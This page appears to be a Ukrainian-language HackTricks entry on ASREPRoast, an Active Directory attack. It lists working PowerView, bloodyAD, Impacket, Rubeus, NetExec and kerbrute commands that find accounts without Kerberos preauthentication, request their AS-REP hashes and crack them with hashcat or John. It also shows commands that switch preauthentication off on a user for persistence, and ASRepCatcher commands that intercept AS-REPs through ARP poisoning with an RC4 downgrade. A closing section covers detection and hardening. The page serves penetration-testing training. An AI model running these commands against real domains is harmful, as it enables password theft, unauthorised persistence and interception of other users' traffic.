# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast — це атака на безпеку, яка експлуатує користувачів, для яких відсутній **атрибут обов'язкової попередньої автентифікації Kerberos**. По суті, ця вразливість дає зловмисникам змогу запитувати автентифікацію користувача в контролера домену (DC) без необхідності знати пароль користувача. Потім DC відповідає повідомленням, зашифрованим ключем, отриманим із пароля користувача, який зловмисники можуть спробувати зламати офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

- **Відсутність попередньої автентифікації Kerberos**: для цільових користувачів цю функцію безпеки має бути вимкнено.
- **Підключення до контролера домену (DC)**: зловмисникам потрібен доступ до DC, щоб надсилати запити й отримувати зашифровані повідомлення.
- **Необов'язковий обліковий запис домену**: наявність облікового запису домену дає змогу зловмисникам ефективніше виявляти вразливих користувачів за допомогою LDAP-запитів. Без такого облікового запису зловмисники мають вгадувати імена користувачів.

#### Перерахування вразливих користувачів (потрібні облікові дані домену)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Запит повідомлення AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus за замовчуванням запитує **RC4**, тому Event ID **4768** зазвичай показує **preauth type 0** і **ticket encryption type 0x17**. Якщо додати **`/aes`** (або RC4 вимкнено для цільового облікового запису), очікуйте **AES etypes** замість цього.<sup>[[2]](#references)</sup>

#### Швидкі one-liners (Linux)

- Спочатку перерахувати потенційні цілі (наприклад, зі leaked build paths) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Виконати roast для всього списку імен користувачів без дійсних облікових даних за допомогою NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Якщо у вас є облікові дані, дозвольте NetExec опитати LDAP і запитати всі roastable облікові записи: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Якщо вивід починається з **`$krb5asrep$23$`**, зламуйте його за допомогою Hashcat **`-m 18200`**. Якщо він починається з **`$krb5asrep$17$`** або **`$krb5asrep$18$`**, надайте перевагу John із параметром **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Не припускайте, що кожен AS-REP roast використовує RC4. Сучасні інструменти можуть повертати **RC4** (`$krb5asrep$23$`) або **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) залежно від запитаного або узгодженого enctype. **`hashcat -m 18200`** призначений для **etype 23**, тоді як **John** безпосередньо обробляє `krb5asrep` для **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Примусово встановити, що **preauth** не потрібен для користувача, для якого ви маєте дозволи **GenericAll** (або дозволи на запис властивостей):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Виявлення та hardening

Успішний roast створює подію **4768** на DC зі значеннями `Status=0x0` і `PreAuthType=0`. Не вимагайте RC4 під час виявлення: `TicketEncryptionType=0x17` є корисним сигналом слабкого шифрування, але атакувальник може запросити AES (значення у журналі подій `0x11`/`0x12`). У Windows Server 2016 і новіших версіях із накопичувальним оновленням від 14 січня 2025 року (або новішим) версія 2 події 4768 також містить `ClientAdvertizedEncryptionTypes`, підтримувані обліковим записом/DC etypes і доступні ключі.<sup>[[5]](#references)</sup>

Практичний hunt виявляє клієнта, який рекламує лише RC4, хоча обліковий запис має ключі AES, а потім корелює сплески запитів з однієї IP-адреси до кількох користувачів без попередньої автентифікації. Визначте легітимні винятки як baseline, замість того щоб створювати alert для кожної події з `PreAuthType=0`.

Надійне виправлення — зняти прапорець **Не вимагати попередньої автентифікації Kerberos** для кожного користувача, якому це не потрібно безпосередньо, і змінити паролі розкритих облікових записів. Якщо виняток неможливо усунути, використовуйте довгий випадково згенерований пароль і мінімальні привілеї. Вимкнення RC4 підвищує вартість cracking, але не усуває можливість roast, оскільки відповіді AES AS-REP усе ще можна crack-ати offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast без облікових даних

Атакувальник on-path може перехопити AS-REP, повернутий під час звичайного AS-обміну з попередньою автентифікацією, і підготувати його зашифровану частину для offline cracking. На відміну від класичного ASREPRoasting, для цього не потрібен `DONT_REQ_PREAUTH`; однак будуть отримані лише ті облікові записи, чий Kerberos-обмін фактично перехоплено. **ASRepCatcher** за замовчуванням отримує потрібну позицію за допомогою одностороннього ARP poisoning або може використовувати трафік, перехоплений іншою технікою MitM, із параметром `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Якщо вам потрібен пов’язаний трюк без облікових даних, який повертає **service ticket**, а не **TGT**, від principal без попередньої автентифікації, див. [Kerberoast](kerberoast.md).

У режимі `relay` [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) пересилає перехоплені AS-REQ і примусово використовує **RC4**, якщо обидві сторони все ще його дозволяють. `listen` не змінює пакети й тому перехоплює той enctype, який узгодили клієнт і DC. За можливості обмежуйте poisoning за допомогою `-t`/`-tf`, а не впливайте на всю підмережу.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Подія 4768: було запитано квиток автентифікації Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
